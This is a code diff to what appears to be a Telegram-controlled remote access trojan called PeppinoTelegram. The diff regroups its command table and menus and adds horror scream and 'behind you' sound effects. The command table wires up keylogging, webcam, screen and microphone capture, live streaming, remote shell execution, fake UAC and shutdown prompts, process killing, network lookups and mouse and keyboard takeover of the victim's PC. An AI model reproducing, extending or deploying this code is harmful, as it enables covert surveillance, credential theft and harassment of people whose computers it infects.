@@ -280,19 +280,25 @@ webcamandscreenstreamstop - Stop both streams.
 
 🔊 Audio & Volume
 urltoast - Windows toast with URL.
-breath - Play breathing sound.
-pss - Play "psst" sound.
-fart - Play fart sound.
 playrandomnoise - Play static/interference.
-knockknock - Play door knocking.
 microphone - Record audio from mic.
 mutevolume - Mute system.
 fullvolume - Max volume.
 setvolume - Set volume level.
 getvolume - Check current volume.
-tralalerotralala - Play Italian brainrot.
 mixermenu - Audio controls menu.
 playfromurl - Play audio from URL.
+
+🎵 Sound Effects
+breath - Play breathing sound.
+fart - Play fart sound.
+knockknock - Play door knocking.
+pss - Play "psst" sound.
+tralalerotralala - Play Italian brainrot.
+scream11s - (Horror) 11 second scream.
+scream15s - (Horror) 15 second scream.
+behindyou_kid - (Horror) "Behind you" (child voice).
+behindyou_whisper - (Horror) "Behind you" (whisper voice).
 
 😈 Pranks & Visuals
 jumpscare - Random jumpscare.
@@ -864,107 +870,139 @@ class PeppinoTelegram:
 
         #gets the function from the text
         self.function_table: dict[str:Callable] = {
-            "pss":self.pss,
-            "psst":self.pss,
-            "bsend":self.bsend,
-            "stop":self.stop,
-            "test":self.test,
-            "altf4":self.altf4,
-            "breath":self.breath,
-            "browser":browseropen,
-            "execute":lambda x: self.bsend(self.execute(x, return_output=True, shell=True)),
-            "selfie":self.selfie,
-            "plankton":self.plankton,
-            "johnpork":self.johnpork,
-            "shutdown":self.shutdown,
-            "gabinetti":self.gabinetti,
-            "jumpscare":self.jumpscare,
-            "keylogger":self.keylogger,
-            "screenshot":self.screenshot,
-            "urltoast":notify_toast,
-            "fakeuac":self.fakeuac,
-            "messagebox":self.message_box,
-            "waitforface":self.waitforface,
-            "webcamclip":self.record_webcam,
-            "screenclip":self.record_screen,
-            "messagespam":self.spam_windows,
-            "checkforface":self.checkforface,
-            "fakeshutdown":self.fake_shutdown,
-            "processkiller":self.process_killer,
-            "livekeylogger":self.live_keylogger,
-            "microphone":self.send_record_audio,
-            "help":lambda: self.bsend(self.help),
-            "invertedscreen":self.inverted_screen,
-            "johnporknoaudio":self.johnporknoaudio,
-            "cmdsession":self.cmdsession,
-            "planktonnoaudio":self.planktonnoaudio,
-            "distortedscreen":self.distorted_screen,
-            "displaymode":self.display_mode,
-            "jumpscarenoaudio":self.jumpscarenoaudio,
-            "deletemessages":self.deleteallmessages,
-            "deleteallmessages":self.deleteallmessages,
-            "getip":self.getip,
-            "mouselock":self.mouselock,
-            "fullclip":self.record_webcam_and_screen,
-            "selfdestruction":self.selfdestruction,
-            "duckyhelp":lambda: self.bsend(self.duckyhelp),
+            # 🏠 Main Menu & Navigation
+            "mainmenu": self.mainmenu,
+            "menu_system": self.menu_system,
+            "menu_network": self.menu_network,
+            "menu_camera": self.menu_camera,
+            "menu_audio": self.menu_audio,
+            "menu_soundfx": self.menu_soundfx,
+            "menu_pranks": self.menu_pranks,
+            "menu_control": self.menu_control,
+            "menu_input": self.menu_input,
+            "menu_messaging": self.menu_messaging,
+            "menu_cantopen": self.menu_cantopen,
+            "menu_keylogger": self.menu_keylogger,
+            "menu_misc": self.menu_misc,
+            "menu_plugins": self.menu_plugins,
+
+            # 🛑 System & Shutdown
+            "shutdown": self.shutdown,
+            "fakeshutdown": self.fake_shutdown,
+            "fakeuac": self.fakeuac,
+            "selfdestruction": self.selfdestruction,
+            "clear": self.clear,
+            "altf4": self.altf4,
+
+            # 📸 Camera & Screen
+            "selfie": self.selfie,
+            "screenshot": self.screenshot,
+            "fullclip": self.record_webcam_and_screen,
+            "webcamclip": self.record_webcam,
+            "screenclip": self.record_screen,
+            "recordjum": self.record_jumpscare_reaction,
+            "waitforface": self.waitforface,
+            "checkforface": self.checkforface,
+            "displaymode": self.display_mode,
+            "webcamstreamstart": self.start_webcam_tunnel,
+            "screenstreamstart": self.start_screen_tunnel,
+            "webcamstreamstop": self.stop_webcam_tunnel,
+            "screenstreamstop": self.stop_screen_tunnel,
+            "webcamandscreenstreamstart": self.start_webcam_and_screen_tunnel,
+            "webcamandscreenstreamstop": self.stop_webcam_and_screen_tunnel,
+            "camerawallpaper": self.setCameraAsWallpaper,
+            "setvideowallpaper": self.setvideowallpaper,
+
+            # 🔊 Audio & Volume
+            "microphone": self.send_record_audio,
+            "mutevolume": lambda: self.audio_mixer.mute(),
+            "fullvolume": lambda: self.audio_mixer.full(),
+            "setvolume": self.audio_mixer.setVolumePercentage,
+            "getvolume": lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
+            "mixermenu": self.mixer_menu,
+            "playfromurl": play_from_url,
+            "playrandomnoise": self.wrapper_playrandomnoise,
+
+            # 🎵 Sound Effects
+            "pss": self.pss,
+            "psst": self.pss,
+            "breath": self.breath,
+            "fart": self.fart,
+            "knockknock": self.knockknock,
+            "tralalerotralala": lambda: self.__play_loaded_sound("tralarero-tralala", volume=8),
+            "scream11s": self.scream_11s,
+            "scream15s": self.scream_15s,
+            "behindyou_kid": self.behindyou_kid,
+            "behindyou_whisper": self.behindyou_whisper,
+
+            # 😈 Pranks & Visuals
+            "jumpscare": self.jumpscare,
+            "jumpscarenoaudio": self.jumpscarenoaudio,
+            "invertedscreen": self.inverted_screen,
+            "distortedscreen": self.distorted_screen,
+            "messagebox": self.message_box,
+            "messagespam": self.spam_windows,
+            "hdmi_drowning_effect": self.wrapper_for_hdmi_overlay,
+            "stop_hdmi_drowning_effect": self.hdmiDrownerOverlayPlayer.stop,
+            "disturbed_overlay_and_random_noise": self.disturbed_overlay_and_random_noise,
+
+            # 🦑 Misc & Memes
+            "plankton": self.plankton,
+            "planktonnoaudio": self.planktonnoaudio,
+            "johnpork": self.johnpork,
+            "johnporknoaudio": self.johnporknoaudio,
+            "gabinetti": self.gabinetti,
             "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
+            "duckyhelp": lambda: self.bsend(self.duckyhelp),
+            "browser": browseropen,
+
+            # 💻 System Control
+            "execute": lambda x: self.bsend(self.execute(x, return_output=True, shell=True)),
+            "processkiller": self.process_killer,
+            "terminateprocess": terminate_process_by_name,
+            "procmonadd": self.processmonitoradd,
+            "procmonrem": self.processmonitorrem,
+            "procmonmenu": self.processmonitormenushow,
+            "cmdsession": self.cmdsession,
+
+            # 🎮 Input / Device Control
+            "randomkeyboard": self.randomkeyboard,
             "capslock": lambda: toducky("CAPSLOCK", execute=True),
-            "randomkeyboard":self.randomkeyboard,
-            "terminateprocess":terminate_process_by_name,
-            "setvideowallpaper":self.setvideowallpaper,
-            "id":lambda:self.bsend(f"🆔 CHAT_ID: {self.owner_id}"),
-            "recordjum":self.record_jumpscare_reaction,
-            "mutevolume":lambda:self.audio_mixer.mute(),
-            "setvolume":self.audio_mixer.setVolumePercentage,
-            "fullvolume":lambda:self.audio_mixer.full(),
-            "wifiinfo":self.wifiinfo,
-            "webcamstreamstart":self.start_webcam_tunnel,
-            "screenstreamstart":self.start_screen_tunnel,
-            "webcamstreamstop":self.stop_webcam_tunnel,
-            "screenstreamstop":self.stop_screen_tunnel,
-            "webcamandscreenstreamstart":self.start_webcam_and_screen_tunnel,
-            "webcamandscreenstreamstop":self.stop_webcam_and_screen_tunnel,
-            "mixermenu":self.mixer_menu,
-            "procmonadd":self.processmonitoradd,
-            "procmonrem":self.processmonitorrem,
-            "procmonmenu":self.processmonitormenushow,
-            "camerawallpaper":self.setCameraAsWallpaper,
-            "mousecontroller":self.mousecontroller,
-            "cantopenmenu":self.cantopenmenu,
-            "cantopenadd":self.cantopen,
-            "cantopenremove":self.removefromcantopen,
-            "clear":self.clear,
-            "mouser":self.mouser,
-            "mousel":self.mousel,
-            "mouseu":self.mouseu,
-            "moused":self.moused,
-            "setMouseJump":self.setMouseJump,
-            "mainmenu":self.mainmenu,
-            "menu_system":self.menu_system,
-            "menu_network":self.menu_network,
-            "menu_camera":self.menu_camera,
-            "menu_audio":self.menu_audio,
-            "menu_pranks":self.menu_pranks,
-            "menu_control":self.menu_control,
-            "menu_input":self.menu_input,
-            "menu_messaging":self.menu_messaging,
-            "menu_cantopen":self.menu_cantopen,
-            "menu_keylogger":self.menu_keylogger,
-            "menu_misc":self.menu_misc,
-            "menu_plugins":self.menu_plugins,
-            "leftclick":self.leftclick,
-            "rightclick":self.rightclick,
-            "hdmi_drowning_effect":self.wrapper_for_hdmi_overlay,
-            "stop_hdmi_drowning_effect":self.hdmiDrownerOverlayPlayer.stop,
-            "playrandomnoise":self.wrapper_playrandomnoise,
-            "fart":self.fart,
-            "knockknock":self.knockknock,
-            "nothing":lambda:...,
-            "playfromurl":play_from_url,
-            "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
-            "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8),
-            "disturbed_overlay_and_random_noise":self.disturbed_overlay_and_random_noise,
+            "mousecontroller": self.mousecontroller,
+            "mouselock": self.mouselock,
+            "setMouseJump": self.setMouseJump,
+            "mouser": self.mouser,
+            "mousel": self.mousel,
+            "mouseu": self.mouseu,
+            "moused": self.moused,
+            "leftclick": self.leftclick,
+            "rightclick": self.rightclick,
+
+            # 📋 Messaging
+            "bsend": self.bsend,
+            "id": lambda: self.bsend(f"🆔 CHAT_ID: {self.owner_id}"),
+            "deletemessages": self.deleteallmessages,
+            "deleteallmessages": self.deleteallmessages,
+
+            # 🔒 Can't Open List
+            "cantopenadd": self.cantopen,
+            "cantopenremove": self.removefromcantopen,
+            "cantopenmenu": self.cantopenmenu,
+
+            # 🧠 Keylogger
+            "keylogger": self.keylogger,
+            "livekeylogger": self.live_keylogger,
+
+            # 🌐 Network & Remote Access
+            "wifiinfo": self.wifiinfo,
+            "getip": self.getip,
+            "urltoast": notify_toast,
+
+            # 🔧 Utilities & Testing
+            "stop": self.stop,
+            "test": self.test,
+            "help": lambda: self.bsend(self.help),
+            "nothing": lambda: ...,
         }
 
         LOADING_STATUS_MESSAGE.edit("COMMANDS LOADED, LOADING PLUGINS")
@@ -1488,6 +1526,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             "🌐 Network & Remote Access": "/menu_network",
             "📸 Camera & Screen": "/menu_camera",
             "🔊 Audio & Volume": "/menu_audio",
+            "🎵 Sound Effects": "/menu_soundfx",  # NEW MENU
             "😈 Pranks & Visuals": "/menu_pranks",
             "💻 System Control": "/menu_control",
             "🎮 Input / Device Control": "/menu_input",
@@ -1565,19 +1604,13 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def menu_audio(self):
         buttons = {
             "🔙 Back": "/mainmenu",
-            "💨 Breath": "/breath",
-            "💨Fart":"/fart",
-            "🚪Knock Knock":"/knockknock",
-            "📢 Pss": "/pss",
-            "🔔 Urltoast": "/urltoast",
             "🎙️ Microphone": "/microphone",
             "🔇 Mute volume": "/mutevolume",
             "🔊 Full volume": "/fullvolume",
             "🎚️ Set volume": "/setvolume",
-            "📈 Get volume": "/getvolume",
-            "🎶 Tralalero tralala": "/tralalerotralala",
+            "📊 Get volume": "/getvolume",
             "🎛️ Mixer menu": "/mixermenu",
-            "🔊🔗 Play from url":"/playfromurl",
+            "🔗 Play from URL": "/playfromurl",
             "📡 Play Noise": "/playrandomnoise",
             "🌀📻 HDMI+Noise": "/disturbed_overlay_and_random_noise",
         }
@@ -1585,6 +1618,35 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
         self.mainmenu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
+        return self.mainmenu_ref
+
+    def menu_soundfx(self):
+        """Sound effects menu"""
+        buttons = {
+            "🔙 Back": "/mainmenu",
+            "🌬️ Breath": "/breath",
+            "💨 Fart": "/fart",
+            "🚪 Knock": "/knockknock",
+            "👂 Psst": "/pss",
+            "🎶 Tralalero": "/tralalerotralala",
+
+            ## Theese are the horror ones
+            "😱 11s Scream": "/scream11s",
+            "😱 15s Scream": "/scream15s",
+            "👶 Behind you (kid)": "/behindyou_kid",
+            "👻 Behind you (whisper)": "/behindyou_whisper",
+        }
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(
+            buttons, 
+            label="🎵 Sound Effects", 
+            next_btn=True, 
+            close_btn_lab="mainmenu_close", 
+            next_btn_lab="mainmenu_next", 
+            prev_btn_lab="mainmenu_prev"
+        )
         return self.mainmenu_ref
 
     def menu_pranks(self):
@@ -2035,6 +2097,18 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def pss(self) -> None:
         self.__play_loaded_sound("pss")
+
+    def behindyou_kid(self) -> None:
+        self.__play_loaded_sound("behindyou_kid")
+
+    def behindyou_whisper(self) -> None:
+        self.__play_loaded_sound("behindyou_whisper")
+
+    def scream_11s(self) -> None:
+        self.__play_loaded_sound("scream_11s")
+
+    def scream_15s(self) -> None:
+        self.__play_loaded_sound("scream_15s")
 
     def wrapper_playrandomnoise(self, duration: int) -> None:
         start = time()
